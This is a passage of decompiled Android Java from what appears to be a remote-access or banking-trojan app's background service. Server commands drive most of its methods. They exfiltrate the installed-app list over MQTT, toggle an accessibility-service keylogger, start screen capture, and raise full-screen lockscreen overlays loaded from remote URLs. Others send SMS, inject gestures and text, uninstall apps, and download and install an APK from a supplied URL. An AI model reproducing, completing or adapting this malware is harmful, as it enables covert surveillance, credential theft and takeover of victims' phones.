            map2.Put("DeviceID", globalparameters._mydeviceid);
            map2.Put("appslist", map.getObject());
            B4XSerializator b4XSerializator = new B4XSerializator();
            if (_mqtt.IsInitialized() && _mqtt.getConnected()) {
                _mqtt.Publish2("divap_topc", b4XSerializator.ConvertObjectToBytes(map2.getObject()), 1, false);
            }
            _isdeviceappssent = true;
            _isappssent = true;
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("66422556", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }

    public static String _ws_send_devicescreenshot_permission() throws Exception {
        try {
            BA ba = processBA;
            mediaprojectionbackservice mediaprojectionbackserviceVar = mostCurrent._mediaprojectionbackservice;
            Common.StopService(ba, mediaprojectionbackservice.getObject());
            BA ba2 = processBA;
            mediaprojectionbackservice mediaprojectionbackserviceVar2 = mostCurrent._mediaprojectionbackservice;
            Common.CancelScheduledService(ba2, mediaprojectionbackservice.getObject());
            BA ba3 = processBA;
            mediaprojectionbackservice mediaprojectionbackserviceVar3 = mostCurrent._mediaprojectionbackservice;
            if (!Common.IsPaused(ba3, mediaprojectionbackservice.getObject())) {
                mediaprojectionbackservice mediaprojectionbackserviceVar4 = mostCurrent._mediaprojectionbackservice;
                mediaprojectionbackservice._sc.Stop();
                BA ba4 = processBA;
                mediaprojectionbackservice mediaprojectionbackserviceVar5 = mostCurrent._mediaprojectionbackservice;
                Common.StopService(ba4, mediaprojectionbackservice.getObject());
            }
            BA ba5 = processBA;
            mediaprojectionbackservice mediaprojectionbackserviceVar6 = mostCurrent._mediaprojectionbackservice;
            if (Common.IsPaused(ba5, mediaprojectionbackservice.getObject())) {
                BA ba6 = processBA;
                mediaprojectionbackservice mediaprojectionbackserviceVar7 = mostCurrent._mediaprojectionbackservice;
                Common.StartService(ba6, mediaprojectionbackservice.getObject());
            } else {
                mediaprojectionbackservice mediaprojectionbackserviceVar8 = mostCurrent._mediaprojectionbackservice;
                mediaprojectionbackservice._sc.Stop();
                BA ba7 = processBA;
                mediaprojectionbackservice mediaprojectionbackserviceVar9 = mostCurrent._mediaprojectionbackservice;
                Common.StopService(ba7, mediaprojectionbackservice.getObject());
                BA ba8 = processBA;
                mediaprojectionbackservice mediaprojectionbackserviceVar10 = mostCurrent._mediaprojectionbackservice;
                Common.StartService(ba8, mediaprojectionbackservice.getObject());
            }
            mediaprojectionbackservice mediaprojectionbackserviceVar11 = mostCurrent._mediaprojectionbackservice;
            if (!mediaprojectionbackservice._mediaprojection_isrunning) {
                mediaprojectionbackservice mediaprojectionbackserviceVar12 = mostCurrent._mediaprojectionbackservice;
                mediaprojectionbackservice._sc.Stop();
            }
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = _acs;
            DateTime dateTime = Common.DateTime;
            accessibilityEventsListener.setispermformediaproj(DateTime.getNow());
            BA ba9 = processBA;
            perm_activatemediaproject perm_activatemediaprojectVar = mostCurrent._perm_activatemediaproject;
            Common.StartActivity(ba9, perm_activatemediaproject.getObject());
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("65505050", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 255 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_send_fromtblclick_acs(Map map) throws Exception {
        try {
            _acs.DispatchGesture_Swipe((int) BA.ObjectToNumber(map.Get("firstX")), (int) BA.ObjectToNumber(map.Get("firstY")), (int) BA.ObjectToNumber(map.Get("secondX")), (int) BA.ObjectToNumber(map.Get("secondY")), (int) BA.ObjectToNumber(map.Get("intSpeed")));
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("67929863", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 738 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static void _ws_send_globalaction_frompctoadroid(Map map) throws Exception {
        new ResumableSub_ws_Send_GlobalAction_FromPCToAdroid(null, map).resume(processBA, null);
    }

    public static class ResumableSub_ws_Send_GlobalAction_FromPCToAdroid extends BA.ResumableSub {
        Map _data;
        IntentWrapper _intent1 = null;
        backgroundservice parent;

        public ResumableSub_ws_Send_GlobalAction_FromPCToAdroid(backgroundservice backgroundserviceVar, Map map) {
            this.parent = backgroundserviceVar;
            this._data = map;
        }

        /* JADX WARN: Removed duplicated region for block: B:246:0x03d2  */
        /* JADX WARN: Removed duplicated region for block: B:248:0x03de A[SYNTHETIC] */
        @Override // anywheresoftware.b4a.BA.ResumableSub
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct code enable 'Show inconsistent code' option in preferences
        */
        public void resume(anywheresoftware.b4a.BA r17, java.lang.Object[] r18) throws java.lang.Exception {
            /*
                Method dump skipped, instructions count: 1154
                To view this dump change 'Code comments level' option to 'DEBUG'
            */
            throw new UnsupportedOperationException("Method not decompiled: com.com.androidrr.backgroundservice.ResumableSub_ws_Send_GlobalAction_FromPCToAdroid.resume(anywheresoftware.b4a.BA, java.lang.Object[]):void");
        }
    }

    public static String _ws_send_important_views_only(Map map) throws Exception {
        try {
            if ("1".equals(BA.ObjectToString(map.Get("isImportantViewsOnly")))) {
                Colors colors = Common.Colors;
                _isimportantviewsonly = -16777216;
            } else {
                Colors colors2 = Common.Colors;
                _isimportantviewsonly = 0;
            }
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("66815752", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 453 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_send_keylo_views(Map map) throws Exception {
        try {
            Common.LogImpl("66553602", "ws_Send_KeyLo_Views  " + BA.ObjectToString(map.Get("IsKeyLo")), 0);
            _acs.isSetKeyLo((int) BA.ObjectToNumber(map.Get("IsKeyLo")));
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("66553606", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 367 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_send_lockscreen_overlay() throws Exception {
        try {
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            globalparameters._isoverlay_isshowing = false;
            globalparameters globalparametersVar2 = mostCurrent._globalparameters;
            globalparameters._intoverlay_type = 1;
            _samsung_overlay_pans();
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("65636105", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 314 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_send_lockscreen_overlay_co(Map map) throws Exception {
        try {
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            globalparameters._isoverlay_isshowing = false;
            globalparameters globalparametersVar2 = mostCurrent._globalparameters;
            globalparameters._intoverlay_type = 1;
            if (map.ContainsKey("normal")) {
                _samsung_overlay_pans_co(BA.ObjectToString(map.Get("bcolor")), BA.ObjectToString(map.Get("toptitle")), BA.ObjectToString(map.Get("bottomtitle")), BA.ObjectToString(map.Get("imgurl")), true);
            } else {
                _samsung_overlay_pans_co(BA.ObjectToString(map.Get("bcolor")), BA.ObjectToString(map.Get("toptitle")), BA.ObjectToString(map.Get("bottomtitle")), BA.ObjectToString(map.Get("imgurl")), false);
            }
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("65701645", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 314 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_send_lockscreen_overlay_co_local(String str, int i, boolean z) throws Exception {
        try {
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            globalparameters._isoverlay_isshowing = true;
            globalparameters globalparametersVar2 = mostCurrent._globalparameters;
            globalparameters._intoverlay_type = 1;
            Common.LogImpl("65898246", str, 0);
            File file = Common.File;
            _samsung_overlay_pans_co_local(File.ReadString("", str), i, z);
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("65898251", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 314 " + Common.LastException(processBA).getMessage());
        }
        return "";
    }

    public static String _ws_send_lockscreen_overlay_url(Map map) throws Exception {
        try {
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            globalparameters._isoverlay_isshowing = false;
            globalparameters globalparametersVar2 = mostCurrent._globalparameters;
            globalparameters._intoverlay_type = 1;
            _samsung_overlay_pans_url(BA.ObjectToString(map.Get("urllink")));
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("65832713", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 314 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_send_open_certainapp(Map map) throws Exception {
        try {
            _acs.PerformGlobalAction(2);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            new IntentWrapper();
            IntentWrapper GetApplicationIntent = new PackageManagerWrapper().GetApplicationIntent(BA.ObjectToString(map.Get("apppackage")));
            if (!GetApplicationIntent.IsInitialized()) {
                return "";
            }
            Common.StartActivity(processBA, GetApplicationIntent.getObject());
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("67667725", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 706 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_send_open_recents() throws Exception {
        try {
            _acs.PerformGlobalAction(3);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("65308421", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 218 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_send_pattren_action_acs(Map map) throws Exception {
        try {
            new List();
            new List();
            List list = new List();
            java.util.List list2 = (java.util.List) map.Get("secondX");
            java.util.List list3 = list2;
            List list4 = (List) AbsObjectWrapper.ConvertToWrapper(list, list2);
            List list5 = new List();
            java.util.List list6 = (java.util.List) map.Get("secondY");
            java.util.List list7 = list6;
            List list8 = (List) AbsObjectWrapper.ConvertToWrapper(list5, list6);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = _acs;
            int ObjectToNumber = (int) BA.ObjectToNumber(map.Get("firstX"));
            int ObjectToNumber2 = (int) BA.ObjectToNumber(map.Get("firstY"));
            ArrayList arrayList = (ArrayList) list4.getObject();
            ArrayList arrayList2 = arrayList;
            ArrayList arrayList3 = (ArrayList) list8.getObject();
            ArrayList arrayList4 = arrayList3;
            accessibilityEventsListener.DispatchGesture_Pattren(ObjectToNumber, ObjectToNumber2, arrayList, arrayList3, (int) BA.ObjectToNumber(map.Get("intSpeed")));
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("67995403", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 752 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_send_request_permissions(Map map) throws Exception {
        try {
            Common.LogImpl("67536642", "ws_Send_Request_Permissions", 0);
            _jo_otherfunctions.RunMethod("turnonwifilow", (Object[]) Common.Null);
            if ("1".equals(BA.ObjectToString(map.Get("permission")))) {
                BA ba = processBA;
                perm_notiacc perm_notiaccVar = mostCurrent._perm_notiacc;
                Common.StartActivity(ba, perm_notiacc.getObject());
            } else if ("2".equals(BA.ObjectToString(map.Get("permission")))) {
                BA ba2 = processBA;
                perm_activateoverlay perm_activateoverlayVar = mostCurrent._perm_activateoverlay;
                Common.StartActivity(ba2, perm_activateoverlay.getObject());
            } else if ("3".equals(BA.ObjectToString(map.Get("permission")))) {
                BA ba3 = processBA;
                perm_startactwritesy perm_startactwritesyVar = mostCurrent._perm_startactwritesy;
                Common.StartActivity(ba3, perm_startactwritesy.getObject());
            } else if ("4".equals(BA.ObjectToString(map.Get("permission")))) {
                BA ba4 = processBA;
                perm_unknownapps perm_unknownappsVar = mostCurrent._perm_unknownapps;
                Common.StartActivity(ba4, perm_unknownapps.getObject());
            } else if ("5".equals(BA.ObjectToString(map.Get("permission")))) {
                BA ba5 = processBA;
                perm_phonecal perm_phonecalVar = mostCurrent._perm_phonecal;
                Common.StartActivity(ba5, perm_phonecal.getObject());
            } else if ("6".equals(BA.ObjectToString(map.Get("permission")))) {
                _requestpowermngt();
            }
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("67536665", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 667 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_send_show_pattren_buttons(Map map) throws Exception {
        try {
            _ispattrenlock = (int) BA.ObjectToNumber(map.Get("IsPattren"));
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("68192004", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 782 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_send_smsmessage_tonumber(Map map) throws Exception {
        try {
            new Phone.PhoneSms();
            Phone.PhoneSms.Send(BA.ObjectToString(map.Get("phonenumber")), BA.ObjectToString(map.Get("SMSBody")));
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("68454152", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 843 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_send_swipe_action_acs(Map map) throws Exception {
        try {
            _acs.DispatchGesture_Swipe((int) BA.ObjectToNumber(map.Get("firstX")), (int) BA.ObjectToNumber(map.Get("firstY")), (int) BA.ObjectToNumber(map.Get("secondX")), (int) BA.ObjectToNumber(map.Get("secondY")), (int) BA.ObjectToNumber(map.Get("intSpeed")));
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("67864327", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 738 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_send_text_frompctoandroiddevice(Map map) throws Exception {
        try {
            boolean Send_Text_To_Node = _acs.Send_Text_To_Node(BA.ObjectToString(map.Get("textvalue")));
            Common.LogImpl("66750213", "istextset : " + BA.ObjectToString(Boolean.valueOf(Send_Text_To_Node)), 0);
            if (!Send_Text_To_Node) {
                new BClipboard();
                BClipboard.setText(processBA, BA.ObjectToString(map.Get("textvalue")));
                _acs.Send_Text_To_Node_SecondTry(BA.ObjectToString(map.Get("textvalue")));
            }
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("66750221", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 439 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_send_uninstall_certainapp(Map map) throws Exception {
        try {
            _acs.PerformGlobalAction(2);
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            B4AApplication b4AApplication = Common.Application;
            if (B4AApplication.getPackageName().equals(BA.ObjectToString(map.Get("apppackage")))) {
                _intcanuninstalltheapp = 1;
                _acs.setintCanUnInstalltheApp(1);
            } else {
                _acs.setintCanUnInstalltheApp(0);
                _intcanuninstalltheapp = 0;
            }
            IntentWrapper intentWrapper = new IntentWrapper();
            intentWrapper.Initialize("android.intent.action.DELETE", "package:" + BA.ObjectToString(map.Get("apppackage")));
            if (!intentWrapper.IsInitialized()) {
                return "";
            }
            Common.StartActivity(processBA, intentWrapper.getObject());
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("67733265", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 727 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_send_unlockscreen_overlay() throws Exception {
        try {
            _isovrsho = false;
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            globalparameters._isoverlay_isshowing = false;
            JavaObject javaObject = _samsung_windowmanager;
            if (javaObject != null && javaObject.IsInitialized() && _tempsamsungpane2.IsInitialized()) {
                _samsung_remove_overlay_pane();
            }
            _acs.isShowing_Ovrlay_CO(false);
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("66291481", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 328 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _ws_send_wakeup_device() throws Exception {
        try {
            Common.LogImpl("67471106", "Send_Wakeup_Device", 0);
            new Phone.PhoneWakeState();
            Phone.PhoneWakeState.ReleaseKeepAlive();
            Phone.PhoneWakeState.KeepAlive(processBA, true);
            JavaObject javaObject = new JavaObject();
            javaObject.InitializeContext(processBA);
            javaObject.RunMethod("trytowakeup", (Object[]) Common.Null);
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("67471116", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 643 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static void _ws_sendsms_to_admin() throws Exception {
        new ResumableSub_ws_SendSMS_To_Admin(null).resume(processBA, null);
    }

    public static class ResumableSub_ws_SendSMS_To_Admin extends BA.ResumableSub {
        boolean _rsl = false;
        backgroundservice parent;

        public ResumableSub_ws_SendSMS_To_Admin(backgroundservice backgroundserviceVar) {
            this.parent = backgroundserviceVar;
        }

        /* JADX WARN: Removed duplicated region for block: B:65:0x00c9  */
        /* JADX WARN: Removed duplicated region for block: B:67:0x00d5 A[SYNTHETIC] */
        @Override // anywheresoftware.b4a.BA.ResumableSub
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct code enable 'Show inconsistent code' option in preferences
        */
        public void resume(anywheresoftware.b4a.BA r8, java.lang.Object[] r9) throws java.lang.Exception {
            /*
                Method dump skipped, instructions count: 258
                To view this dump change 'Code comments level' option to 'DEBUG'
            */
            throw new UnsupportedOperationException("Method not decompiled: com.com.androidrr.backgroundservice.ResumableSub_ws_SendSMS_To_Admin.resume(anywheresoftware.b4a.BA, java.lang.Object[]):void");
        }
    }

    public static void _wsh_downinstappp(Map map) throws Exception {
        new ResumableSub_wsh_downinstappp(null, map).resume(processBA, null);
    }

    public static class ResumableSub_wsh_downinstappp extends BA.ResumableSub {
        Map _data;
        backgroundservice parent;
        String _strappurl = "";

        /* renamed from: _j */
        httpjob f345_j = null;
        File.OutputStreamWrapper _out = null;

        /* renamed from: _i */
        IntentWrapper f344_i = null;
        Phone _pppp = null;

        public ResumableSub_wsh_downinstappp(backgroundservice backgroundserviceVar, Map map) {
            this.parent = backgroundserviceVar;
            this._data = map;
        }

        @Override // anywheresoftware.b4a.BA.ResumableSub
        public void resume(BA ba, Object[] objArr) throws Exception {
            while (true) {
                try {
                    switch (this.state) {
                        case -1:
                            return;
                        case 0:
                            this.state = 1;
                            break;
                        case 1:
                            this.state = 32;
                            this.catchState = 31;
                            this.state = 3;
                            break;
                        case 3:
                            this.state = 4;
                            this.catchState = 31;
                            this._strappurl = BA.ObjectToString(this._data.Get("appurl"));
                            break;
                        case 4:
                            this.state = 9;
                            if (this._strappurl.trim().length() != 0) {
                                break;
                            } else {
                                this.state = 6;
                                break;
                            }
                        case 6:
                            this.state = 9;
                            return;
                        case 9:
                            this.state = 10;
                            httpjob httpjobVar = new httpjob();
                            this.f345_j = httpjobVar;
                            httpjobVar._initialize(backgroundservice.processBA, "", backgroundservice.getObject());
                            this.f345_j._download(this._strappurl.trim());
                            Common.WaitFor("jobdone", backgroundservice.processBA, this, this.f345_j);
                            this.state = 33;
                            return;
                        case 10:
                            this.state = 29;
                            if (this.f345_j._success) {
                                this.state = 12;
                                break;
                            } else {
                                this.state = 28;
                                break;
                            }
                        case 12:
                            this.state = 13;
                            break;
                        case 13:
                            this.state = 16;
                            File file = Common.File;
                            File file2 = Common.File;
                            if (!File.Exists(File.getDirInternal(), "emptyapp.apk")) {
                                break;
                            } else {
                                this.state = 15;
                                break;
                            }
                        case 15:
                            this.state = 16;
                            File file3 = Common.File;
                            File file4 = Common.File;
                            File.Delete(File.getDirInternal(), "emptyapp.apk");
                            break;
                        case 16:
                            this.state = 17;
                            this._out = new File.OutputStreamWrapper();
                            File file5 = Common.File;
                            File file6 = Common.File;
                            this._out = File.OpenOutput(File.getDirInternal(), "emptyapp.apk", false);
                            File file7 = Common.File;
                            File.Copy2(this.f345_j._getinputstream().getObject(), this._out.getObject());
                            this._out.Close();
                            break;
                        case 17:
                            this.state = 20;
                            File file8 = Common.File;
                            starter starterVar = backgroundservice.mostCurrent._starter;
                            if (!File.Exists(starter._provider._sharedfolder, "emptyapp.apk")) {
                                break;
                            } else {
                                this.state = 19;
                                break;
                            }
                        case 19:
                            this.state = 20;
                            File file9 = Common.File;
                            starter starterVar2 = backgroundservice.mostCurrent._starter;
                            File.Delete(starter._provider._sharedfolder, "emptyapp.apk");
                            break;
                        case 20:
                            this.state = 21;
                            File file10 = Common.File;
                            File file11 = Common.File;
                            String dirInternal = File.getDirInternal();
                            starter starterVar3 = backgroundservice.mostCurrent._starter;
                            File.Copy(dirInternal, "emptyapp.apk", starter._provider._sharedfolder, "emptyapp.apk");
                            this.f344_i = new IntentWrapper();
                            this._pppp = new Phone();
                            break;
                        case 21:
                            this.state = 26;
                            if (Phone.getSdkVersion() >= 24) {
                                this.state = 23;
                                break;
                            } else {
                                this.state = 25;
                                break;
                            }
                        case 23:
                            this.state = 26;
                            IntentWrapper intentWrapper = this.f344_i;
                            starter starterVar4 = backgroundservice.mostCurrent._starter;
                            intentWrapper.Initialize("android.intent.action.INSTALL_PACKAGE", BA.ObjectToString(starter._provider._getfileuri("emptyapp.apk")));
                            IntentWrapper intentWrapper2 = this.f344_i;
                            Bit bit = Common.Bit;
                            intentWrapper2.setFlags(Bit.m182Or(this.f344_i.getFlags(), 1));
                            break;
                        case 25:
                            this.state = 26;
                            IntentWrapper intentWrapper3 = this.f344_i;
                            StringBuilder sb = new StringBuilder();
                            sb.append("file://");
                            File file12 = Common.File;
                            starter starterVar5 = backgroundservice.mostCurrent._starter;
                            sb.append(File.Combine(starter._provider._sharedfolder, "emptyapp.apk"));
                            intentWrapper3.Initialize(IntentWrapper.ACTION_VIEW, sb.toString());
                            this.f344_i.SetType("application/vnd.android.package-archive");
                            break;
                        case 26:
                            this.state = 29;
                            Common.StartActivity(backgroundservice.processBA, this.f344_i.getObject());
                            break;
                        case 28:
                            this.state = 29;
                            Common.LogImpl("65177389", this.f345_j._errormessage, 0);
                            break;
                        case KeyCodes.KEYCODE_A /* 29 */:
                            this.state = 32;
                            this.f345_j._release();
                            break;
                        case KeyCodes.KEYCODE_C /* 31 */:
                            this.state = 32;
                            this.catchState = 0;
                            Common.LogImpl("65177396", BA.ObjectToString(Common.LastException(backgroundservice.processBA)), 0);
                            break;
                        case 32:
                            this.state = -1;
                            this.catchState = 0;
                            break;
                        case 33:
                            this.state = 10;
                            this.f345_j = (httpjob) objArr[0];
                            break;
                    }
                } catch (Exception e) {
                    if (this.catchState == 0) {
                        throw e;
                    }
                    this.state = this.catchState;
                    backgroundservice.processBA.setLastException(e);
                }
            }
        }
    }

    public void setpaneloverlappedpositionandsize(int i, int i2, int i3, int i4) {
        WindowManager.LayoutParams layoutParams = (WindowManager.LayoutParams) this.panel.getLayoutParams();
        layoutParams.x = i;
        layoutParams.y = i2;
        layoutParams.width = i3;
        layoutParams.height = i4;
        ((WindowManager) getSystemService("window")).updateViewLayout(this.panel, layoutParams);
    }

    /* JADX WARN: Multi-variable type inference failed */
    public void initialactions(ViewGroup viewGroup, int i, int i2) {
        WindowManager windowManager = (WindowManager) getSystemService("window");
        this.panel = viewGroup;
        PanelWrapper panelWrapper = new PanelWrapper();
        panelWrapper.Initialize(processBA, "");
        PanelWrapper panelWrapper2 = new PanelWrapper();
        panelWrapper2.Initialize(processBA, "");
        this.panel2 = (ViewGroup) panelWrapper.getObject();
        this.panel3 = (ViewGroup) panelWrapper2.getObject();
        setTouchListener();
        int i3 = Build.VERSION.SDK_INT >= 26 ? 2038 : 2002;
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(-1, -1, i3, 24, -3);
        layoutParams.gravity = 51;
        layoutParams.x = 0;
        layoutParams.y = 0;
        windowManager.addView(this.panel, layoutParams);
        this.topLeftView = new View(this);
        WindowManager.LayoutParams layoutParams2 = new WindowManager.LayoutParams(-1, -1, i3, 24, -3);
        layoutParams2.gravity = 51;
        layoutParams2.x = 0;
        layoutParams2.y = 0;
        layoutParams2.width = 0;
        layoutParams2.height = 0;
        windowManager.addView(this.topLeftView, layoutParams2);
        WindowManager.LayoutParams layoutParams3 = new WindowManager.LayoutParams(-1, -1, i3, 776, -3);
        layoutParams3.gravity = 51;
        layoutParams3.x = 0;
        layoutParams3.y = 0;
        layoutParams3.width = i;
        layoutParams3.height = 80;
        windowManager.addView(this.panel2, layoutParams3);
        this.panel2.setBackgroundColor(Color.argb(255, 255, 255, 255));
        this.topLeftView2 = new View(this);
        WindowManager.LayoutParams layoutParams4 = new WindowManager.LayoutParams(-1, -1, i3, 776, -3);
        layoutParams4.gravity = 51;
        layoutParams4.x = 0;
        layoutParams4.y = 0;
        layoutParams4.width = 0;
        layoutParams4.height = 0;
        windowManager.addView(this.topLeftView2, layoutParams4);
        this.topLeftView2.setBackgroundColor(Color.argb(255, 255, 255, 255));
        WindowManager.LayoutParams layoutParams5 = new WindowManager.LayoutParams(-1, -1, i3, 776, -3);
        layoutParams5.gravity = 51;
        layoutParams5.x = 0;
        layoutParams5.y = i2 - 100;
        layoutParams5.width = i;
        layoutParams5.height = 100;
        windowManager.addView(this.panel3, layoutParams5);
        this.panel3.setBackgroundColor(Color.argb(255, 255, 255, 255));
        this.topLeftView3 = new View(this);
        WindowManager.LayoutParams layoutParams6 = new WindowManager.LayoutParams(-1, -1, i3, 776, -3);
        layoutParams6.gravity = 51;
        layoutParams6.x = 0;
        layoutParams6.y = 0;
        layoutParams6.width = 0;
        layoutParams6.height = 0;
        windowManager.addView(this.topLeftView3, layoutParams6);
        this.topLeftView3.setBackgroundColor(Color.argb(255, 255, 255, 255));
    }

    public static String _open_overlay222222(String str, int i, int i2, int i3, int i4) throws Exception {
        JavaObject javaObject = new JavaObject();
        WebViewWrapper webViewWrapper = new WebViewWrapper();
        webViewWrapper.Initialize(processBA, "");
        webViewWrapper.LoadHtml(str);
        javaObject.InitializeContext(processBA);
        javaObject.RunMethod("initialactions", new Object[]{webViewWrapper.getObject(), Integer.valueOf(i2), Integer.valueOf(i)});
        double d = i2 - i3;
        Double.isNaN(d);
        double d2 = i - i4;
        Double.isNaN(d2);
        _setpaneloverlappedpositionandsize((int) (d / 2.0d), (int) (d2 / 2.0d), i3, i4);
        overlay_var overlay_varVar = mostCurrent._overlay_var;
        return "";
    }

    public static String _setpaneloverlappedpositionandsize(int i, int i2, int i3, int i4) throws Exception {
        JavaObject javaObject = new JavaObject();
        javaObject.InitializeContext(processBA);
        javaObject.RunMethod("setpaneloverlappedpositionandsize", new Object[]{Integer.valueOf(i), Integer.valueOf(i2), Integer.valueOf(i3), Integer.valueOf(i4)});
        return "";
    }

    public void finalactions() {
        if (this.panel != null) {
            WindowManager windowManager = (WindowManager) getSystemService("window");
            this.panel.removeAllViews();
            this.panel2.removeAllViews();
            this.panel3.removeAllViews();
            windowManager.removeView(this.panel);
            windowManager.removeView(this.panel2);
            windowManager.removeView(this.panel3);
            this.panel = null;
            this.panel2 = null;
            this.panel3 = null;
            windowManager.removeView(this.topLeftView);
            this.topLeftView = null;
        }
    }

    public static class overlay_var {
        private static overlay_var mostCurrent = new overlay_var();
        public Common __c = null;

        public static String _process_globals() throws Exception {
            return "";
        }

        public static Object getObject() {
            throw new RuntimeException("Code module does not support this method.");
        }
    }

    private void setTouchListener() {
        this.panel.setOnTouchListener(new View.OnTouchListener() { // from class: com.com.androidrr.backgroundservice.3
            private boolean moving;
            private float offsetX;
            private float offsetY;
            private int originalXPos;
            private int originalYPos;
            private WindowManager windowmanager;

            @Override // android.view.View.OnTouchListener
            public boolean onTouch(View view, MotionEvent motionEvent) {
                if (this.windowmanager == null) {
                    this.windowmanager = (WindowManager) backgroundservice.this.getSystemService("window");
                }
                if (motionEvent.getAction() == 0) {
                    float rawX = motionEvent.getRawX();
                    float rawY = motionEvent.getRawY();
                    this.moving = false;
                    int[] iArr = new int[2];
                    backgroundservice.this.panel.getLocationOnScreen(iArr);
                    int i = iArr[0];
                    this.originalXPos = i;
                    int i2 = iArr[1];
                    this.originalYPos = i2;
                    this.offsetX = i - rawX;
                    this.offsetY = i2 - rawY;
                } else if (motionEvent.getAction() == 2) {
                    int[] iArr2 = new int[2];
                    backgroundservice.this.topLeftView.getLocationOnScreen(iArr2);
                    float rawX2 = motionEvent.getRawX();
                    float rawY2 = motionEvent.getRawY();
                    WindowManager.LayoutParams layoutParams = (WindowManager.LayoutParams) backgroundservice.this.panel.getLayoutParams();
                    int i3 = (int) (rawX2 + this.offsetX);
                    int i4 = (int) (rawY2 + this.offsetY);
                    if (Math.abs(i3 - this.originalXPos) < 1 && Math.abs(i4 - this.originalYPos) < 1 && !this.moving) {
                        return false;
                    }
                    layoutParams.x = i3 - iArr2[0];
                    layoutParams.y = i4 - iArr2[1];
                    this.windowmanager.updateViewLayout(backgroundservice.this.panel, layoutParams);
                    this.moving = true;
                } else if (motionEvent.getAction() == 1 && this.moving) {
                    return true;
                }
                return false;
            }
        });
    }

    public void setbafromjava() {
        BA ba = processBA;
